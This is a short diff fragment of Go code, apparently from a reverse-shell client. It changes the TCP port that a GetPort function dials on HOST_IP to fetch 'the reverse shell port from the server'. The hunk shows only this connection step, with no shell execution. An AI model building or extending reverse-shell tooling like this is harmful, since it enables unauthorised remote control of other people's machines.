@@ -20,7 +20,7 @@ func main() {
 
 func GetPort() string {
 	//Get the reverse shell port from the server
-	getPort, err := net.Dial("tcp", HOST_IP+":5003")
+	getPort, err := net.Dial("tcp", HOST_IP+":8003")
 	if err != nil {
 		fmt.Println("Couldn't get connection")
 		return "-1"
